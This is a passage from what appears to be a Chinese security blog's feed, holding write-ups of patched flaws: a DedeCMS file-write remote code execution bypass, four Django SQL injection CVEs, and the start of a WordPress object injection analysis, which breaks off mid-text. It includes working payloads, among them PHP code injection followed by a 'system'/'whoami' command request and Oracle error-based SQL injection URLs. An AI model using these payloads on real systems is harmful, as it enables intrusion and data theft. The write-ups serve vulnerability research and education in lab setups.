<code>get</code> 上来的变量注册成真的变量，那么我们可以虚构几个变量写入 <code>login.data.php</code> 文件，之后执行包含时，我们直接 <code>post</code> 那些变量即可注册成真的变量，然后执行代码，比如</li></ol><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-symbol">$ad</span>(<span class="hljs-symbol">$mi</span>n)<br></code></pre></td></tr></table></figure><p>最后我们的 <code>payload</code> 为</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-string">&#x27;;<span class="hljs-subst">$ad</span>(<span class="hljs-subst">$min</span>);?&gt;</span><br></code></pre></td></tr></table></figure><p>过滤之后就会变成  <code>admin</code>，因此可以获取到用户名，也就可以执行到 写入 <code>shell</code> 的地方</p><p>写入后，在 <code>login.php</code> 这边再次请求，带上两个参数</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">ad=<span class="hljs-keyword">system</span>&amp;<span class="hljs-built_in">min</span>=whoami<br></code></pre></td></tr></table></figure><p>即可执行成功</p><h3 id="CVE-2022-36216"><a href="#CVE-2022-36216" class="headerlink" title="CVE-2022-36216"></a>CVE-2022-36216</h3><p>还提一下这个洞，出现漏洞的原因与上面的 <code>CVE</code> 一样，也是在记录次数的时候进行了文件写入，因此放在此处归类一下。看到这个 <code>CVE</code> 的时候以为也是前台洞，后面发现并不是。</p><p>漏洞位于 <code>dede/member_toadmin.php</code></p><p><img src="20221004172640.png" alt="1"></p><p>一模一样的代码，也是通过这个 <code>json_encode</code> 的函数进行的写入，因此有了绕过单引号过滤的可能，最后直接写入，造成了文件写入并可以代码执行。这个洞的价值没那么高，必须在管理后台才可以执行成功，因此就不复现了。</p><h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><h3 id="CVE-2022-35516-1"><a href="#CVE-2022-35516-1" class="headerlink" title="CVE-2022-35516"></a>CVE-2022-35516</h3><p><img src="image-20220801220842470.png" alt="1"></p><h3 id="修补绕过-1"><a href="#修补绕过-1" class="headerlink" title="修补绕过"></a>修补绕过</h3><h4 id="步骤一：写入代码"><a href="#步骤一：写入代码" class="headerlink" title="步骤一：写入代码"></a>步骤一：写入代码</h4><p>得到 <code>data/login.data.php</code> 内容</p><p><img src="image-20220801231204371-16648742730497.png" alt="1"></p><h4 id="步骤二：执行代码"><a href="#步骤二：执行代码" class="headerlink" title="步骤二：执行代码"></a>步骤二：执行代码</h4><p>要记得更换验证码</p><p><img src="image-20220801231351275-16648742730508.png" alt="1"></p><p>要注意，这里直接访问 <code>data/login.data.php</code> 是不行的！一定要记得加上验证码</p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p><code>dedecms</code> 最近更新比较频繁，增加了不少的功能，但是也带来了更多的风险，比如这里的漏洞就是因此增加了登录次数的计数导致的。其他的肯定也存着不少的问题，可以多关注一下。</p><p>此处第一部分的漏洞问题比较容易看出来，很简单的文件写入，后面的过滤绕过还是花了一些的时间去分析才得出来的，当时尝试了多种方式，有点以前打 <code>CTF</code> 时候的感觉，一定就是有洞，但是不知道如何实现 ，最后成功利用的时候还是挺激动的。</p><p>最后，代码审计的时候一定要多注意 <code>json_encode</code> 这类型可以影响字符的函数，有时候说不定就通过这个拿到了 <code>RCE</code> 漏洞。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本文首发于奇安信攻防社区：&lt;a href=&quot;https://forum.butian.net/share/1940&quot;&gt;https://forum.butian.net/share/1940&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;本文仅用于技术讨论与研究，文中的实现方法切勿应用在任何违法场景</summary>
      
    
    
    
    <category term="漏洞挖掘" scheme="https://d5shenwu.github.io/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    
    <category term="PHP" scheme="https://d5shenwu.github.io/tags/PHP/"/>
    
    <category term="未授权漏洞" scheme="https://d5shenwu.github.io/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="RCE" scheme="https://d5shenwu.github.io/tags/RCE/"/>
    
    <category term="CVE" scheme="https://d5shenwu.github.io/tags/CVE/"/>
    
    <category term="DedeCMS" scheme="https://d5shenwu.github.io/tags/DedeCMS/"/>
    
    <category term="CNVD" scheme="https://d5shenwu.github.io/tags/CNVD/"/>
    
  </entry>
  
  <entry>
    <title>细数Django框架核心历史SQL注入漏洞（上）</title>
    <link href="https://d5shenwu.github.io/2022/09/23/%E7%BB%86%E6%95%B0Django%E6%A1%86%E6%9E%B6%E6%A0%B8%E5%BF%83%E5%8E%86%E5%8F%B2SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%8A%EF%BC%89/"/>
    <id>https://d5shenwu.github.io/2022/09/23/%E7%BB%86%E6%95%B0Django%E6%A1%86%E6%9E%B6%E6%A0%B8%E5%BF%83%E5%8E%86%E5%8F%B2SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%8A%EF%BC%89/</id>
    <published>2022-09-23T14:24:53.000Z</published>
    <updated>2022-11-04T14:29:58.024Z</updated>
    
    <content type="html"><![CDATA[<p>本文首发于奇安信攻防社区：<a href="https://forum.butian.net/share/1923">https://forum.butian.net/share/1923</a></p><p>本文仅用于技术讨论与研究，文中的实现方法切勿应用在任何违法场景。如因涉嫌违法造成的一切不良影响，本文作者概不负责。</p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近总结了一下 <code>Django</code> 框架曾经出现的 <code>SQL</code> 注入漏洞，总共有七个 <code>CVE</code> ，分别都简单分析复现并写了文章，总体来说会觉得比较有意思，在这里分享一下。</p><h2 id="0x01-目录"><a href="#0x01-目录" class="headerlink" title="0x01 目录"></a>0x01 目录</h2><p>本篇文章分享四个 <code>CVE</code> ，剩余三个 <code>CVE</code> 将在下篇文章展现。</p><ul><li>CVE-2019-14234</li><li>CVE-2020-7471</li><li>CVE-2020-9402</li><li>CVE-2021-35042</li></ul><h2 id="0x02-CVE-2019-14234"><a href="#0x02-CVE-2019-14234" class="headerlink" title="0x02 CVE-2019-14234"></a>0x02 CVE-2019-14234</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p><code>Django</code> 在2019年发布的一个安全更新，修复了在 <code>JSONField</code>、<code>HStoreField</code> 两个模型字段中存在的SQL注入漏洞。</p><h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><ul><li>Django 2.2.x &lt; 2.2.4</li><li>Django 2.1.x &lt; 2.1.11</li><li>Django 1.11.x &lt; 1.11.23</li></ul><p>该漏洞需要开发者使用了 <code>JSONField</code> 或者 <code>HStoreField</code> ，并且 <code>QuerySet</code> 中的键名可控，<code>Django</code> 自带的 <code>Django-admin</code> 中就存在这样的写法，可以利用其进行攻击。</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>当我们进行查询时，会使用到 <code>QuerySet</code> ，一般形式为</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Collection<span class="hljs-selector-class">.objects</span><span class="hljs-selector-class">.filter</span>(blog__author__extra=<span class="hljs-string">&#x27;tom&#x27;</span>)<span class="hljs-selector-class">.all</span>()<br></code></pre></td></tr></table></figure><p><code>filter</code> 中包含三个部分，由 <code>__</code> 分割，第一部分被称为 <code>transform</code> ，比如此处，就是查找 <code>blog</code> 表中的 <code>author</code> 字段，一般这里就是通过外键表现两个表之间的关系，但也存在特殊情况，比如存在 <code>JSONField</code> 类型的字段时，那么就是从 <code>JSON</code> 字段中查找；第二部分是字段，表的字段或者 <code>JSON</code> 的字段；第三部分被称为 <code>lookup</code> ，表示为后面值之间的对比关系，可不写，默认为 <code>extra</code>。</p><p>此处我们选择 <code>JSONField</code> 进行分析，当 <code>blog</code> 字段为 <code>JSONField</code> 类型时，</p><p><img src="20220921171923.png" alt="1"></p><p><code>JSONField</code> 继承自 <code>Field</code> ，<code>Field</code> 又是继承 <code>RegisterLookupMixin</code> ，已经存在一个 <code>get_transform</code> 方法，此处由于获取方式不同，因此重写该方法，之后是返回了一个 <code>KeyTransformFactory(name)</code> ，接下来看看这里的代码</p><p><img src="image-20220921173225909.png" alt="1"></p><p>直接被调用时，又会触发 <code>KeyTransform(self.key_name, *args, **kwargs)</code></p><p><img src="20220921173335.png" alt="1"></p><p>在这里，最后会被执行 <code>as_sql</code> 方法，目的是生成 <code>sql</code> 语句，但是这里的 <code>self.key_name</code> 没有经过任何过滤就被拼接并直接返回，因此造成了注入。</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>复现直接借助了 <code>vulhub</code> 的环境，直接启动，环境代码可以直接在最下面的参考链接中找到</p><p>如下所示，<code>Collections</code> 就是在 <code>model</code> 中使用了 <code>JSONField</code> </p><p><img src="20220921153333.png" alt="1"></p><p>代码和细节如下</p><p><img src="20220921153819.png" alt="1"></p><p>此处的 <code>detail</code> 使用了 <code>JSONField</code> ，访问链接即可触发漏洞</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//y</span>our-ip:<span class="hljs-number">8000</span><span class="hljs-regexp">/admin/</span>vuln<span class="hljs-regexp">/collection/</span>?detail__a%<span class="hljs-number">27</span>b=<span class="hljs-number">123</span><br></code></pre></td></tr></table></figure><p><img src="20220921154135.png" alt="1"></p><h2 id="0x03-CVE-2020-7471"><a href="#0x03-CVE-2020-7471" class="headerlink" title="0x03 CVE-2020-7471"></a>0x03 CVE-2020-7471</h2><h3 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p><code>Django</code> 在2020年发布的一个安全更新，修复了在 <code>StringAgg</code> 中存在的SQL注入漏洞。</p><h3 id="漏洞影响-1"><a href="#漏洞影响-1" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><ul><li>Django 2.2.x &lt; 2.2.10</li><li>Django 3.0.x &lt; 3.0.3</li><li>Django 1.11.x &lt; 1.11.28</li></ul><p>该漏洞需要开发者使用了 <code>StringAgg</code>  ，并且 <code>delimiter</code> 参数可控，则可以利用其进行攻击。</p><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>先来看到 <code>github</code> 上的代码比对</p><p><img src="20220921230809.png" alt="1"></p><p>这里说明两点问题，第一， <code>delimter</code> 参数没有经过过滤就传入，第二，<code>delimter</code> 会直接进行字符串拼接，因此也是导致了存在 <code>SQL</code> 注入漏洞的原因。</p><p>接下来我们要做的就是找到使用该漏洞类的地方，关于 <code>StringAgg</code> 的使用可以看官方文档 <code>https://docs.djangoproject.com/zh-hans/4.1/ref/contrib/postgres/aggregates/</code> </p><p>很容易就可以得到一个可以利用的场景</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Collection<span class="hljs-selector-class">.objects</span><span class="hljs-selector-class">.annotate</span>(tempname=<span class="hljs-built_in">StringAgg</span>(<span class="hljs-string">&#x27;name&#x27;</span>, delimiter=query))<span class="hljs-selector-class">.values</span>(<span class="hljs-string">&#x27;name&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><code>vulhub</code> 中没有找到相应的环境，找一个类似的环境改改，注意也需要使用 <code>postgres</code> 数据库</p><p><code>views.py</code></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> django.shortcuts import render, HttpResponse<br><span class="hljs-keyword">from</span> .models import Collection<br><span class="hljs-keyword">from</span> django.contrib.postgres.aggregates.general import StringAgg<br><br><span class="hljs-comment"># Create your views here.</span><br><br>def vuln(request):<br>    query = request.GET.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;q&#x27;</span>, <span class="hljs-attribute">default</span>=0.05)<br>    qs = Collection.objects.annotate(<span class="hljs-attribute">tempname</span>=StringAgg(&#x27;name&#x27;, <span class="hljs-attribute">delimiter</span>=query))<br>    <span class="hljs-built_in">print</span>(qs.query)<br>    return HttpResponse(qs)<br><br></code></pre></td></tr></table></figure><p><code>models.py</code></p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-title">from</span> django.db <span class="hljs-keyword">import</span> models<br><span class="hljs-title">from</span> django.contrib.postgres.fields <span class="hljs-keyword">import</span> JSONField<br><span class="hljs-class"></span><br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-type">Collection</span>(<span class="hljs-title">models</span>.<span class="hljs-type">Model</span>):</span><br><span class="hljs-class">    name = models.<span class="hljs-type">CharField</span>(<span class="hljs-title">max_length</span>=128)</span><br><span class="hljs-class">    detail = models.<span class="hljs-type">CharField</span>(<span class="hljs-title">max_length</span>=128)</span><br><span class="hljs-class"></span><br><span class="hljs-class">    def __str__(<span class="hljs-title">self</span>):</span><br><span class="hljs-class">        return self.name</span><br><span class="hljs-class"></span><br></code></pre></td></tr></table></figure><p><code>urls.py</code></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">from</span> django.contrib <span class="hljs-keyword">import</span> <span class="hljs-keyword">admin</span><br><span class="hljs-keyword">from</span> django.urls <span class="hljs-keyword">import</span> <span class="hljs-type">path</span><br><span class="hljs-keyword">from</span> vuln <span class="hljs-keyword">import</span> views<br><br><br>urlpatterns = [<br>    path(<span class="hljs-string">&#x27;admin/&#x27;</span>, <span class="hljs-keyword">admin</span>.site.urls),<br>    path(<span class="hljs-string">&#x27;vuln/&#x27;</span>, views.vuln),<br>]<br><br></code></pre></td></tr></table></figure><p>最后可以得到如下 <code>poc</code></p><p><img src="20220921231943.png" alt="1"></p><h2 id="0x04-CVE-2020-9402"><a href="#0x04-CVE-2020-9402" class="headerlink" title="0x04 CVE-2020-9402"></a>0x04 CVE-2020-9402</h2><h3 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p><code>Django</code> 在2020年发布的安全更新，修复了在 <code>GIS</code> 查询功能中存在的 <code>SQL</code> 注入漏洞。</p><h3 id="漏洞影响-2"><a href="#漏洞影响-2" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><ul><li>Django 2.2.x &lt; 2.2.11</li><li>Django 1.11.x &lt; 1.11.29</li><li>Django 3.0.x &lt; 3.0.4</li></ul><p>需要使用了 <code>GIS</code> 聚合查询，用户使用 <code>oracle</code> 的数据库且存在可控 <code>tolerance</code> </p><h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>首先看 <code>github</code> 的分析  <code>https://github.com/django/django/commit/fe886a3b58a93cfbe8864b485f93cb6d426cd1f2</code></p><p><img src="20220921205621.png" alt="1"></p><p>这里修补了两处漏洞，都是同一个参数 <code>tolerance</code> 引起的，看到这里会觉得还比较简单，直接从 <code>self.extra</code> 中获取到参数，直接进行拼接，得到最后的 <code>sql</code> 代码，<code>as_oracle</code> 方法，就是得到的 <code>oracle</code> 的 <code>sql</code> 代码，也就是这个漏洞应该只存在于使用 <code>oracle</code> 数据库时</p><p>虽然知道这里存在漏洞，我们更重要的是去获取什么时候会触发这两个漏洞，所以要去看代码，可以直接搜索 <code>tolerance</code></p><h4 id="第一处漏洞"><a href="#第一处漏洞" class="headerlink" title="第一处漏洞"></a>第一处漏洞</h4><p>位于 <code>django\contrib\gis\db\models\aggregates.py</code></p><p><img src="20220921210237.png" alt="1"></p><p>此类继承于 <code>django.db.models.aggregates.Aggregate</code> ，然后下面这个 <code>Union</code> 类又继承 <code>GeoAggregate</code> </p><p><img src="20220921210544.png" alt="1"></p><p>因此可以通过使用 <code>GIS</code> 中的 <code>Union</code> 类来触发第一个漏洞</p><h4 id="第二处漏洞"><a href="#第二处漏洞" class="headerlink" title="第二处漏洞"></a>第二处漏洞</h4><p>位于 <code>django\contrib\gis\db\models\functions.py</code></p><p><img src="20220921211016.png" alt="1"></p><p>这里逻辑也是一样，没有任何过滤，接下来就是去找可以直接调用这里的位置，也就是找继承的位置，可以找到下面这个 <code>Distance</code></p><p><img src="20220921211202.png" alt="1"></p><p>至于接下来该如何去直接使用这两个类，可以查看官方文档，这里我直接看的 <code>vulhub</code> 中的</p><p><img src="20220921211336.png" alt="1"></p><h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>复现直接借助了 <code>vulhub</code> 的环境，直接启动，环境代码可以直接在最下面的参考链接中找到</p><p>第一处 <code>payload</code></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8000</span>/vuln/q=?<span class="hljs-number">20</span>) = <span class="hljs-number">1</span> <span class="hljs-keyword">OR</span> (<span class="hljs-keyword">select</span> utl_inaddr.get_host_name((<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">version</span> <span class="hljs-keyword">FROM</span> v$instance)) <span class="hljs-keyword">from</span> dual) <span class="hljs-keyword">is</span> <span class="hljs-keyword">null</span> <span class="hljs-keyword">OR</span> (<span class="hljs-number">1</span><span class="hljs-number">-1</span><br></code></pre></td></tr></table></figure><p><img src="image-20220921212748553.png" alt="1"></p><p>第二处 <code>payload</code></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8000</span>/vuln2/q=?<span class="hljs-number">0.05</span>))) <span class="hljs-keyword">FROM</span> &quot;VULN_COLLECTION2&quot; <span class="hljs-keyword">where</span> (<span class="hljs-keyword">select</span> utl_inaddr.get_host_name((<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">FROM</span> DUAL)) <span class="hljs-keyword">from</span> dual) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span> <span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><p><img src="image-20220921212404303.png" alt="1"></p><h2 id="0x05-CVE-2021-35042"><a href="#0x05-CVE-2021-35042" class="headerlink" title="0x05 CVE-2021-35042"></a>0x05 CVE-2021-35042</h2><h3 id="漏洞描述-3"><a href="#漏洞描述-3" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p><code>Django</code> 在2021年发布的安全更新，修复了在 <code>order_by </code> 中存在的 <code>SQL</code> 注入漏洞。</p><h3 id="漏洞影响-3"><a href="#漏洞影响-3" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><ul><li>Django 3.1.x &lt; 3.1.13</li><li>Django 3.2.x &lt; 3.2.5</li></ul><p>需要使用了 <code>order_by </code> </p><h3 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>出现问题的点是在 <code>order_by</code> ，先搜索这个方法</p><p><img src="20220922105526.png" alt="1"></p><p>首先 <code>clean_ordering</code> ，也就是将 <code>ordering</code> 置空</p><p><img src="image-20220922105747504.png" alt="1"></p><p>然后进行 <code>add_ordering</code></p><p><img src="20220922105840.png" alt="1"></p><p>想要将传进来的字段添加到 <code>order_by</code> ，需要经过一些验证</p><p>将每一部分取出来进行比较，是字符串时进行比较，包含点号时，直接 <code>continue</code> ，跳过了后面的 <code>names_to_path</code> 验证，因此可以通过添加点号的形式绕过。</p><p>处理带点号的代码位于文件 <code>django/db/models/sql/compiler.py </code>的 <code>get_order_by </code>函数中，核心代码如下</p><p><img src="20220922162157.png" alt="1"></p><p>在这里对 <code>table</code> 进行了过滤，但是并没有对 <code>col</code> 进行过滤，因此造成了注入。</p><h3 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>复现直接借助了 <code>vulhub</code> 的环境，直接启动，环境代码可以直接在最下面的参考链接中找到</p><p>简单来个报错的 <code>payload</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8000</span><span class="hljs-regexp">/vuln/</span>?order=aaa.ta<span class="hljs-string">b&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="20220922163320.png" alt="1"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本文首发于奇安信攻防社区：&lt;a href=&quot;https://forum.butian.net/share/1923&quot;&gt;https://forum.butian.net/share/1923&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;本文仅用于技术讨论与研究，文中的实现方法切勿应用在任何违法场景</summary>
      
    
    
    
    <category term="Python漏洞复现" scheme="https://d5shenwu.github.io/categories/Python%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="CVE" scheme="https://d5shenwu.github.io/tags/CVE/"/>
    
    <category term="SQL注入漏洞" scheme="https://d5shenwu.github.io/tags/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="漏洞复现" scheme="https://d5shenwu.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="Python" scheme="https://d5shenwu.github.io/tags/Python/"/>
    
    <category term="Django" scheme="https://d5shenwu.github.io/tags/Django/"/>
    
  </entry>
  
  <entry>
    <title>WordPress_5.8.2_对象注入漏洞_CVE-2022-21663</title>
    <link href="https://d5shenwu.github.io/2022/02/16/WordPress-5-8-2-%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2022-21663/"/>
    <id>https://d5shenwu.github.io/2022/02/16/WordPress-5-8-2-%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2022-21663/</id>
    <published>2022-02-16T02:28:26.000Z</published>
    <updated>2022-11-04T14:19:23.643Z</updated>
    
    <content type="html"><![CDATA[<p>本文首发于奇安信攻防社区：<a href="https://forum.butian.net/share/1303">https://forum.butian.net/share/1303</a></p><p>本文仅用于技术讨论与研究，文中的实现方法切勿应用在任何违法场景。如因涉嫌违法造成的一切不良影响，本文作者概不负责。</p><h2 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h2><p>看了 <code>wordpress</code>注入（ <code>CVE-2022-21661</code> ）的洞之后，发现还存在另外一个对象注入漏洞，具有管理员权限的用户通过更改一些选项，将有机会 <code>getshell</code>。</p><h2 id="0x01-漏洞影响"><a href="#0x01-漏洞影响" class="headerlink" title="0x01 漏洞影响"></a>0x01 漏洞影响</h2><p><code>getshell</code>的条件：</p><ul><li><p><code>wordpress &lt; 5.8.3</code></p></li><li><p>启用多站点模式</p></li><li><p>存在一条可用的反序列化链（在本文中不会讲这个）</p></li></ul><p>这是 <code>github</code>上的漏洞修复记录</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/WordPress/</span>WordPress<span class="hljs-regexp">/commit/</span><span class="hljs-number">66</span>bb979049fa1a515d031e53ab100d507ed7bc8b<br></code></pre></td></tr></table></figure><p><img src="1645017413692-340e0a04-00f9-4ac1-be41-896ad2f07c85.png" alt="1"></p><p>因此这里的环境选择前一条提交</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">git <span class="hljs-keyword">clone</span> https:<span class="hljs-comment">//github.com/WordPress/WordPress</span><br>git checkout <span class="hljs-number">7</span>d20ea9<br></code></pre></td></tr></table></figure><h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>这里是以我复现这个漏洞时候的角度来分析的，因此会有一些弯路</p><h3 id="漏洞入口点"><a href="#漏洞入口点" class="headerlink" title="漏洞入口点"></a>漏洞入口点</h3><p>首先来到 <code>wp-admin/upgrade.php</code>，这是管理员可以直接访问到的文件，也是我认为的此漏洞的入口点。</p><p><img src="1645016015891-21b5b1a1-46d9-404a-8801-e6c89a6f7fbc.png" alt="1"></p><p>跟进 <code>wp_upgrade</code>函数，来到 <code>wp-admin/includes/upgrade.php</code></p><p><img src="1645016103918-353490ff-585c-4a2a-960a-330be6f1acad.png" alt="1"></p><p>首先看几个全局变量，<code>$wp_db_version</code>在 <code>wp-includes/version.php</code>中定义，根据其定义处的注释来看，这是本安装程序的数据库版本，在下一行中从数据库中取出了 <code>db_version</code>赋值给 <code>$wp_current_db_version</code>，看这情况，大概是一个是固定的数据库版本，另一个是可变的，<code>upgrade.php</code>会时不时地比较，当发生改变时，会进行一些操作</p><p>接下来看到我下的断点处，进入 <code>upgrade_all()</code>函数</p><p><img src="1645016595248-a63a464a-0cbc-4203-bfe2-b192e18d0227.png" alt="1"></p><p>这里就是在将两个版本进行比较，一致时不发生任何变化，不一致时运行后面的代码，接着看下面</p><p><img src="1645016658540-437ff7af-3fdb-414f-ba4a-db536ec3197f.png" alt="1"></p><p>根据从数据库中取出的 <code>db_version</code>也就是此处的 <code>$wp_current_db_version</code>的大小，会进行不同的处理，我们来关注断点处的 <code>upgrade_280</code>函数</p><p><img src="1645016845600-d2145051-be96-4802-9733-ba339c957596.png" alt="1"></p><p>看到 1611 行的 <code>is_multisite()</code>，跟进</p><p><img src="1645016943319-8531ffcb-c3ff-4525-bce6-849147549291.png" alt="1"></p><p>这是一个判断是否开启了多站点的函数，这也是本漏洞的一个开启条件，必须要开启多站点才可以。开多站点需要改配置文件，我这里图省事儿，直接改了判断条件 <code>!is_multisite()</code>，强行让他绕过了 </p><p>继续看上面，进入循环，每次从 <code>wp_options</code>表中取 20 条数据，将每一条数据都进行反序列化，漏洞的点就在此处了，因为 <code>wp_options</code>中的数据大部分都是可控的，我们可以通过管理员修改其值，最后进入反序列化。</p><p>还有两个问题，第一，如何控制 <code>db_version</code>的值，让他进入我们想要进入的函数；第二，如何更改 <code>wp_options</code>中的值。</p><h3 id="数据写入"><a href="#数据写入" class="headerlink" title="数据写入"></a>数据写入</h3><p>其实这两个是同一个问题，一并解决，<code>wordpress</code>后台没有直接访问所有 <code>options</code>的按钮，但我们可以访问 <code>wp-admin/options.php</code></p><p><img src="1645017818708-9ea5b601-fcba-4f81-ad90-1c66eb516163.png" alt="1"></p><p>这里可以更改 <code>db_options</code>中大部分的值，包括 <code>db_version</code>，我们将其修改为 10300，就满足了进入漏洞函数的要求，接下来我们尝试写入反序列化字符串</p><p>我们先随便选择一个选项写入反序列化字符串，这里我首先选择的是 <code>blogdescription</code>，也就是博客描述，这个也可以在常规选项中更改（更建议，因为需要处理的值会更少，调试没那么费力）,<code>post</code>的数据会逐个进入 <code>wp-includes/option.php</code>中的 <code>update_option</code>，来看几个比较重要的函数（PS：太长截图截不完）</p><p><img src="1645018862918-8acd7c3e-15ce-4cda-a723-210ef2901ffe.png" alt="1"></p><p>这里首先说明一下 <code>$option</code>是每个选项的键，<code>$value</code>是每个选项的值</p><p>首先看到 <code>sanitize_option</code></p><p><img src="1645019077487-63d2de3b-61aa-4518-b451-da43f296998b.png" alt="1"></p><p>这个函数会根据不同的键来选择不同的处理方式，比如一些一定会用整数的，就会<code>intval</code>处理，所以选择的选项也是有讲究的，我之前选择的<code>blogdescription</code>，就因为这个函数而无法使用，他会将一些特殊字符编码，导致无法正常反序列化，这个可以慢慢尝试，尽量选择这个函数不会进行太多处理的选项</p><p>最终我选择的是 <code>wp-admin/options-writing.php</code>中的 “密码”（选择 <code>options.php</code>中的<code>mailserver_pass</code>也一样，是同一个），一般来说，密码对字符都不会有太多的限制，至少这里是的</p><p>回到之前的 <code>update_option</code>的代码，稍微注意一下这里的比较</p><p><img src="1645019573871-fdeab791-ede5-4600-a056-4f7078ebbd2f.png" 